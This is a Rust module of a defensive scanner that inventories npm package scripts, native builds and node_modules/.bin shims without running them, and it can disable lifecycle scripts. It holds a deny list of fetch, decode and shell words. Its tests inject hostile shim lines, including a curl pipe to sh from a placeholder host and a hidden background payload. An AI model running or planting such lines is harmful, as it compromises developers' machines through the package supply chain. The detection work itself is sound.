use crate::{
    checks::shell,
    model::{Report, Severity},
    store::{digest, read_file, Store, MAX_INPUT},
};
use anyhow::{bail, Context, Result};
use std::{
    fs,
    io::Read,
    path::{Path, PathBuf},
};

pub fn packages(store: &Store, path: &Path) -> Result<Report> {
    let r = inventory(path)?;
    store.save(&r)?;
    Ok(r)
}

/// The package-script inventory, not yet saved.
pub fn inventory(path: &Path) -> Result<Report> {
    let mut r = Report::new("Package script inventory", path.display());
    r.coverage.push("Reads package manifests and script source as data; never invokes npm, build backends, or lifecycle hooks. Unknown/generated commands remain unresolved.".into());
    if path.extension().is_some_and(|e| e == "tgz" || e == "gz") {
        let bytes = read_file(path, 32 * MAX_INPUT)?;
        r.sha256 = Some(digest(&bytes));
        let mut archive = tar::Archive::new(flate2::read::GzDecoder::new(bytes.as_slice()));
        let mut total = 0usize;
        let mut manifests = vec![];
        let mut gyps = vec![];
        for (i, entry) in archive.entries()?.enumerate() {
            if i >= 10000 {
                r.errors.push("Archive entry limit reached".into());
                break;
            }
            let mut e = entry?;
            if !e.header().entry_type().is_file() {
                continue;
            }
            let p = e.path()?.into_owned();
            if e.size() > MAX_INPUT {
                r.errors
                    .push(format!("Oversized archive member {}", p.display()));
                continue;
            }
            let mut b = vec![];
            e.by_ref().take(MAX_INPUT + 1).read_to_end(&mut b)?;
            total += b.len();
            if total > 32 * MAX_INPUT as usize {
                r.errors.push("Archive expansion limit reached".into());
                break;
            }
            if p.file_name().is_some_and(|n| n == "package.json") {
                manifest(&mut r, &p, &b)?;
                manifests.push((p, b));
            } else if p.file_name().is_some_and(|n| n == "binding.gyp") {
                gyps.push((p, b));
            } else if p
                .extension()
                .is_some_and(|e| ["js", "cjs", "mjs", "sh"].iter().any(|x| e == *x))
            {
                source_findings(&mut r, &p, &b);
            }
        }
        for (gyp, text) in &gyps {
            let dir = gyp.parent().unwrap_or(Path::new(""));
            if let Some((m, b)) = manifests.iter().find(|(m, _)| m.parent() == Some(dir)) {
                gyp_build(
                    &mut r,
                    m,
                    &serde_json::from_slice(b).unwrap_or_default(),
                    gyp,
                    text,
                );
            }
        }
    } else {
        let root = fs::canonicalize(path)?;
        let mut identity = vec![];
        let mut count = 0;
        let mut paths: Vec<PathBuf> = if root.is_file() {
            vec![root.clone()]
        } else {
            walkdir::WalkDir::new(&root)
                .follow_links(false)
                .max_depth(16)
                .into_iter()
                .filter_entry(|e| {
                    !matches!(e.file_name().to_str(), Some(".git" | "target" | ".venv"))
                })
                .take(50000)
                .filter_map(|e| match e {
                    Ok(e) if e.file_type().is_file() && e.file_name() == "package.json" => {
                        Some(e.into_path())
                    }
                    Err(e) => {
                        r.errors.push(e.to_string());
                        None
                    }
                    _ => None,
                })
                .collect()
        };
        paths.sort();
        for p in paths.iter().take(2000) {
            let b = read_file(p, MAX_INPUT)?;
            identity.extend_from_slice(p.as_os_str().as_encoded_bytes());
            identity.extend_from_slice(&b);
            manifest(&mut r, p, &b)?;
            count += 1;
            let value: serde_json::Value = serde_json::from_slice(&b)?;
            let gyp = p.with_file_name("binding.gyp");
            if let Ok(text) = read_file(&gyp, MAX_INPUT) {
                gyp_build(&mut r, p, &value, &gyp, &text);
            }
            if let Some(scripts) = value["scripts"].as_object() {
                for command in scripts.values().filter_map(|s| s.as_str()) {
                    for token in command.split_whitespace().filter(|t| {
                        t.ends_with(".js")
                            || t.ends_with(".cjs")
                            || t.ends_with(".mjs")
                            || t.ends_with(".sh")
                    }) {
                        let candidate = p.parent().unwrap().join(token.trim_matches(['\'', '"']));
                        if let Ok(c) = fs::canonicalize(candidate) {
                            if c.starts_with(p.parent().unwrap()) {
                                if let Ok(bytes) = read_file(&c, MAX_INPUT) {
                                    identity.extend_from_slice(&bytes);
                                    source_findings(&mut r, &c, &bytes);
                                }
                            }
                        }
                    }
                }
            }
        }
        if paths.len() > 2000 {
            r.errors.push("Package manifest limit reached".into());
        }
        if count == 0 {
            r.errors.push("No package.json files found. Provide a project, installed dependency tree, or npm .tgz archive.".into());
        }
        if root.is_dir() {
            let projects: Vec<&Path> = paths
                .iter()
                .filter(|p| !p.components().any(|c| c.as_os_str() == "node_modules"))
                .filter_map(|p| p.parent())
                .take(50)
                .collect();
            for project in &projects {
                bin_links(&mut r, &root, project);
            }
            if projects
                .iter()
                .any(|p| p.join("node_modules/.bin").is_dir())
            {
                r.coverage.push("Commands in node_modules/.bin were checked for where they lead, not for the content of the package files they run.".into());
            }
            let lock = root.join("package-lock.json");
            if lock.exists() {
                let v: serde_json::Value =
                    serde_json::from_slice(&read_file(&lock, 32 * MAX_INPUT)?)?;
                if let Some(pkgs) = v["packages"].as_object() {
                    for (name, meta) in pkgs {
                        if meta["hasInstallScript"] == true
                            && !root.join(name).join("package.json").is_file()
                        {
                            r.add(
                                "package.unresolved-hook",
                                Severity::Review,
                                "Lockfile declares an unavailable installation script",
                                format!("{name} {}", meta["version"]),
                                "Inspect the package archive without running lifecycle scripts.",
                            );
                        }
                    }
                }
            }
            r.coverage.push(format!(
                "{count} manifests read. Dependencies absent from disk are not fully inspected."
            ));
        }
        r.sha256 = Some(digest(&identity));
    }
    Ok(r)
}
/// Words no command shim needs: they fetch, decode, open a connection or reach
/// into your home folder.
const SHIM_DENY: [&str; 11] = [
    "curl", "wget", "http://", "https://", "base64", "eval", "/dev/tcp", "python", " nc ", "$HOME",
    "~/",
];

/// `path` with `.` and `..` resolved by name, without asking the filesystem.
fn lexical(path: &Path) -> PathBuf {
    use std::path::Component;
    let mut out = PathBuf::new();
    for c in path.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other),
        }
    }
    out
}

/// Whether `path`, relative to the `.bin` folder or absolute, is inside some
/// node_modules within the project being checked. Workspaces lead into the
/// workspace root's node_modules, so any of them counts.
fn in_modules(bin: &Path, root: &Path, path: &str) -> bool {
    let p = lexical(&bin.join(path));
    p.starts_with(root) && p.components().any(|c| c.as_os_str() == "node_modules")
}

/// What is wrong with a pnpm shim, if anything. pnpm's shims differ between
/// versions, so their lines are not matched one by one. What is checked is what
/// they lead to: the files `exec`, NODE_PATH and the `cmd-shim-target` note name
/// must be in node_modules, every absolute path must be in the project (or be
/// /dev/null), and no word that downloads, decodes or reaches your home folder
/// may appear.
fn shim_problem(text: &str, bin: &Path, root: &Path) -> Option<String> {
    if !text.starts_with("#!/bin/sh") || !text.contains("basedir") {
        return Some("is a plain file but not a pnpm command shim".into());
    }
    if let Some(word) = SHIM_DENY.iter().find(|w| text.contains(*w)) {
        return Some(format!(
            "contains `{}`, which no command shim needs",
            word.trim()
        ));
    }
    let absolute = regex::Regex::new(r#"(?:^|[\s"'=:(])(/[\w.@+-]+(?:/[\w.@+-]+)+)"#).unwrap();
    if let Some(p) = absolute
        .captures_iter(text)
        .map(|c| c.get(1).unwrap().as_str())
        .find(|p| *p != "/dev/null" && !lexical(Path::new(p)).starts_with(root))
    {
        return Some(format!("names {p}, outside the project"));
    }
    for line in text.lines().map(str::trim) {
        let mut paths: Vec<&str> = vec![];
        if let Some(target) = line.strip_prefix("# cmd-shim-target=") {
            paths.push(target);
        } else if let Some(value) = line.strip_prefix("export NODE_PATH=\"") {
            paths.extend(
                value
                    .trim_end_matches('"')
                    .split(':')
                    .filter(|p| *p != "$NODE_PATH")
                    .map(|p| p.strip_prefix("$basedir_abs/").unwrap_or(p)),
            );
        } else if let Some(rest) = line.strip_prefix("exec ") {
            for token in rest.split_whitespace().map(|t| t.trim_matches('"')) {
                if let Some(rel) = token
                    .strip_prefix("$basedir/")
                    .or_else(|| token.strip_prefix("$basedir_abs/"))
                    .or_else(|| token.strip_prefix("$basedir_win/"))
                {
                    if !matches!(rel, "node" | "node.exe") {
                        paths.push(rel);
                    }
                } else if !matches!(token, "node" | "node.exe" | "$@") {
                    return Some(format!(
                        "runs `{token}`, not node or a file in node_modules"
                    ));
                }
            }
        }
        if let Some(p) = paths.iter().find(|p| !in_modules(bin, root, p)) {
            return Some(format!("leads to {p}, outside node_modules"));
        }
    }
    None
}

/// The commands in a project's node_modules/.bin, which `npm run` and `npx` put
/// first on PATH. npm, Yarn and Bun make each one a link into node_modules, and
/// pnpm a shell shim that runs node on a file there. A plain file where a link
/// belongs, or a command that leads outside the project's node_modules, was put
/// there by something other than the package manager. `root` is the folder being
/// checked, already canonical.
fn bin_links(r: &mut Report, root: &Path, project: &Path) {
    let bin = project.join("node_modules/.bin");
    let Ok(entries) = fs::read_dir(&bin) else {
        return;
    };
    let pnpm = project
        .ancestors()
        .take_while(|a| a.starts_with(root))
        .any(|a| {
            a.join("node_modules/.pnpm").is_dir()
                || a.join("node_modules/.modules.yaml").is_file()
                || a.join("pnpm-lock.yaml").is_file()
        });
    for e in entries.flatten().take(5000) {
        let path = e.path();
        let name = e.file_name().to_string_lossy().into_owned();
        // pnpm also writes Windows shims, which no Linux shell runs.
        if name.ends_with(".cmd") || name.ends_with(".CMD") || name.ends_with(".ps1") {
            continue;
        }
        let Ok(meta) = path.symlink_metadata() else {
            continue;
        };
        let problem = if meta.file_type().is_symlink() {
            let link = fs::read_link(&path).unwrap_or_default();
            if !in_modules(&bin, root, &link.to_string_lossy()) {
                Some(format!("leads to {}, outside node_modules", link.display()))
            } else {
                // A workspace package is linked from node_modules to its own folder,
                // which still has to be in the project.
                match fs::canonicalize(&path) {
                    Ok(target) if !target.starts_with(root) => Some(format!(
                        "leads to {}, outside the project",
                        target.display()
                    )),
                    _ => None,
                }
            }
        } else if !meta.is_file() {
            None
        } else if pnpm {
            match read_file(&path, 64 * 1024) {
                Ok(b) => shim_problem(&String::from_utf8_lossy(&b), &bin, root),
                Err(_) => Some("is a plain file too large to be a command shim".into()),
            }
        } else {
            Some("is a plain file; npm, Yarn and Bun put a link here".into())
        };
        if let Some(problem) = problem {
            r.add(
                "package.bin-swapped",
                Severity::High,
                &format!("node_modules/.bin/{name} {problem}"),
                format!("{}\n{}", path.display(), meta_line(&meta)),
                "`npm run` and `npx` run this before any other program of that name. Delete node_modules and install again from the lockfile, and find out what wrote this file.",
            );
        }
    }
}

fn meta_line(meta: &fs::Metadata) -> String {
    use std::os::unix::fs::PermissionsExt;
    if meta.file_type().is_symlink() {
        "symbolic link".into()
    } else {
        format!(
            "file, {} bytes, mode {:04o}",
            meta.len(),
            meta.permissions().mode() & 0o7777
        )
    }
}

pub(crate) fn manifest(r: &mut Report, p: &Path, b: &[u8]) -> Result<()> {
    let v: serde_json::Value =
        serde_json::from_slice(b).with_context(|| format!("Invalid manifest {}", p.display()))?;
    if let Some(scripts) = v["scripts"].as_object() {
        for (name, command) in scripts {
            let lifecycle = [
                "preinstall",
                "install",
                "postinstall",
                "prepare",
                "prepublish",
                "prepack",
            ]
            .contains(&name.as_str());
            r.add(if lifecycle{"package.lifecycle"}else{"package.script"},if lifecycle{Severity::Review}else{Severity::Info},&format!("{}@{}: {name}",v["name"].as_str().unwrap_or("unnamed"),v["version"].as_str().unwrap_or("unknown")),format!("{}\n{}",p.display(),command.as_str().unwrap_or("invalid script")),"Review referenced source. Installation approvals do not constrain later runtime behavior.");
            if let Some(s) = command.as_str() {
                source_findings(r, p, s.as_bytes());
            }
        }
    }
    Ok(())
}
/// npm runs `node-gyp rebuild` at install for a package with a binding.gyp and
/// no install or preinstall script of its own, so the hook is not in `scripts`.
fn gyp_build(r: &mut Report, manifest: &Path, value: &serde_json::Value, gyp: &Path, text: &[u8]) {
    let scripts = &value["scripts"];
    if scripts.get("install").is_some() || scripts.get("preinstall").is_some() {
        return;
    }
    let text = String::from_utf8_lossy(text);
    let mut evidence = format!(
        "{}\nnpm runs node-gyp rebuild when it installs this package",
        gyp.display()
    );
    // <!( and <!@( run a shell command while gyp reads the file.
    for (n, line) in text
        .lines()
        .enumerate()
        .filter(|(_, l)| l.contains("<!(") || l.contains("<!@("))
        .take(5)
    {
        evidence.push_str(&format!("\nline {}: {}", n + 1, line.trim()));
    }
    r.add(
        "package.gyp-build",
        Severity::Review,
        &format!(
            "{}@{}: builds native code at install",
            value["name"].as_str().unwrap_or("unnamed"),
            value["version"].as_str().unwrap_or("unknown")
        ),
        format!("{}\n{evidence}", manifest.display()),
        "The build runs a compiler and any command binding.gyp names, with your permissions, during npm install. Read binding.gyp, or install with --ignore-scripts.",
    );
}

fn source_findings(r: &mut Report, p: &Path, b: &[u8]) {
    let scan = shell::analyze_content(&String::from_utf8_lossy(b));
    for error in scan.errors {
        r.errors.push(format!("{}: {error}", p.display()));
    }
    for mut f in scan.findings {
        if r.findings.len() >= 10000 {
            let limit = "Package finding limit reached; additional findings omitted".to_owned();
            if !r.errors.contains(&limit) {
                r.errors.push(limit);
            }
            break;
        }
        f.evidence = format!("{}: {}", p.display(), f.evidence);
        r.findings.push(f);
    }
}

pub fn policy(path: &Path, apply: bool) -> Result<String> {
    let root = fs::canonicalize(path)?;
    if !root.is_dir() {
        bail!("Select a project directory");
    }
    let p = root.join(".npmrc");
    let old = if p.exists() {
        String::from_utf8(read_file(&p, MAX_INPUT)?)?
    } else {
        String::new()
    };
    let new = format!(
        "{}{}# Bigman: disable automatic lifecycle execution for npm/pnpm\nignore-scripts=true\n",
        old,
        if old.ends_with('\n') || old.is_empty() {
            ""
        } else {
            "\n"
        }
    );
    if apply {
        if p.exists() {
            let backup = root.join(format!(".npmrc.bigman-{}.bak", uuid::Uuid::new_v4()));
            fs::copy(&p, &backup)?;
        }
        let mut tmp = tempfile::NamedTempFile::new_in(&root)?;
        use std::io::Write;
        tmp.write_all(new.as_bytes())?;
        tmp.persist(&p).map_err(|e| e.error)?;
    }
    Ok(format!("{} {}\nSets ignore-scripts=true for npm/pnpm; command-line overrides and explicit npm run commands can still execute code.{}",if apply{"Updated"}else{"Would update"},p.display(),if apply{" Existing configuration backed up when present."}else{" Use Apply to write this project-local setting."}))
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn inventories_without_executing() {
        let d = tempfile::tempdir().unwrap();
        let store = Store::open(Some(d.path().join("state"))).unwrap();
        let project = d.path().join("project");
        fs::create_dir(&project).unwrap();
        fs::write(
            project.join("package.json"),
            r#"{"name":"fixture","version":"1","scripts":{"postinstall":"touch MUST_NOT_EXIST"}}"#,
        )
        .unwrap();
        let r = packages(&store, &project).unwrap();
        assert!(r.findings.iter().any(|f| f.rule == "package.lifecycle"));
        assert!(!project.join("MUST_NOT_EXIST").exists());
    }

    /// A project with a package.json and the given node_modules files and .bin
    /// entries (a link target, or file content), and what fired.
    fn bin_findings(
        pnpm: bool,
        files: &[(&str, &str)],
        bins: &[(&str, Result<&str, &str>)],
    ) -> Vec<String> {
        let d = tempfile::tempdir().unwrap();
        let root = d.path().join("app");
        fs::create_dir_all(root.join("node_modules/.bin")).unwrap();
        fs::write(
            root.join("package.json"),
            r#"{"name":"app","version":"1.0.0"}"#,
        )
        .unwrap();
        if pnpm {
            fs::create_dir_all(root.join("node_modules/.pnpm")).unwrap();
        }
        for (path, text) in files {
            let p = root.join(path);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(p, text).unwrap();
        }
        for (name, entry) in bins {
            let p = root.join("node_modules/.bin").join(name);
            match entry {
                Ok(target) => std::os::unix::fs::symlink(target, p).unwrap(),
                Err(text) => fs::write(
                    p,
                    text.replace("{root}", &root.canonicalize().unwrap().to_string_lossy()),
                )
                .unwrap(),
            }
        }
        inventory(&root)
            .unwrap()
            .findings
            .into_iter()
            .filter(|f| f.rule == "package.bin-swapped")
            .map(|f| f.summary)
            .collect()
    }

    const OLD_PNPM_SHIM: &str = r#"#!/bin/sh
basedir=$(dirname "$(echo "$0" | sed -e 's,\\,/,g')")
case `uname` in
    *CYGWIN*) basedir=`cygpath -w "$basedir"`;;
esac
if [ -z "$NODE_PATH" ]; then
  export NODE_PATH="{root}/node_modules/.pnpm/typescript@5.4.5/node_modules:{root}/node_modules/.pnpm/node_modules"
else
  export NODE_PATH="{root}/node_modules/.pnpm/typescript@5.4.5/node_modules:$NODE_PATH"
fi
if [ -x "$basedir/node" ]; then
  exec "$basedir/node"  "$basedir/../typescript/bin/tsc" "$@"
else
  exec node  "$basedir/../typescript/bin/tsc" "$@"
fi
"#;

    const NEW_PNPM_SHIM: &str = r#"#!/bin/sh
link="$0"
target=$(run_helper readlink "$link")
basedir=$(run_helper printf '%s\n' "$link" | run_helper sed -e 's,\\,/,g')
basedir_abs=$(CDPATH= cd -P -- "$basedir" && pwd -P) || exit $?
if command -v node >/dev/null 2>&1; then
  export NODE_PATH="$basedir_abs/../.pnpm/typescript@5.4.5/node_modules"
  exec node  "$basedir_abs/../.pnpm/typescript@5.4.5/node_modules/typescript/bin/tsc" "$@"
fi
# cmd-shim-target=../.pnpm/typescript@5.4.5/node_modules/typescript/bin/tsc
"#;

    #[test]
    fn npm_links_into_node_modules_pass_and_plain_files_do_not() {
        let tsc = [("node_modules/typescript/bin/tsc", "")];
        assert!(bin_findings(false, &tsc, &[("tsc", Ok("../typescript/bin/tsc"))]).is_empty());
        let found = bin_findings(
            false,
            &tsc,
            &[("tsc", Err("#!/bin/sh\nexec node ../typescript/bin/tsc\n"))],
        );
        assert_eq!(
            found,
            ["node_modules/.bin/tsc is a plain file; npm, Yarn and Bun put a link here"]
        );
        let outside = bin_findings(false, &[], &[("git", Ok("../../../../../../usr/bin/git"))]);
        assert!(outside[0].contains("outside node_modules"), "{outside:?}");
    }

    #[test]
    fn an_npm_workspace_link_may_lead_to_a_package_in_the_project() {
        // node_modules/tool links to ../packages/tool, as npm workspaces do.
        let d = tempfile::tempdir().unwrap();
        let root = d.path().join("mono");
        fs::create_dir_all(root.join("packages/tool/bin")).unwrap();
        fs::write(root.join("packages/tool/bin/tool.js"), "").unwrap();
        fs::create_dir_all(root.join("node_modules/.bin")).unwrap();
        fs::write(
            root.join("package.json"),
            r#"{"name":"mono","version":"1.0.0"}"#,
        )
        .unwrap();
        std::os::unix::fs::symlink("../packages/tool", root.join("node_modules/tool")).unwrap();
        std::os::unix::fs::symlink("../tool/bin/tool.js", root.join("node_modules/.bin/tool"))
            .unwrap();
        let r = inventory(&root).unwrap();
        assert!(
            !r.findings.iter().any(|f| f.rule == "package.bin-swapped"),
            "{:?}",
            r.findings
        );
    }

    #[test]
    fn pnpm_shims_of_either_format_pass_and_tampered_ones_do_not() {
        assert!(bin_findings(true, &[], &[("tsc", Err(OLD_PNPM_SHIM))]).is_empty());
        assert!(bin_findings(true, &[], &[("tsc", Err(NEW_PNPM_SHIM))]).is_empty());
        let fetches =
            OLD_PNPM_SHIM.replace("if [ -x", "curl -s https://example.invalid/x | sh\nif [ -x");
        assert!(bin_findings(true, &[], &[("tsc", Err(&fetches))])[0].contains("`curl`"));
        let elsewhere = NEW_PNPM_SHIM.replace("exec node ", "exec /tmp/.cache/tool ");
        assert!(!bin_findings(true, &[], &[("tsc", Err(&elsewhere))]).is_empty());
        let side = NEW_PNPM_SHIM.replace("link=\"$0\"", "link=\"$0\"\n/var/tmp/payload &");
        assert!(bin_findings(true, &[], &[("tsc", Err(&side))])[0].contains("/var/tmp/payload"));
        assert!(
            bin_findings(true, &[], &[("tsc", Err("#!/bin/sh\necho hi\n"))])[0]
                .contains("not a pnpm command shim")
        );
    }
}
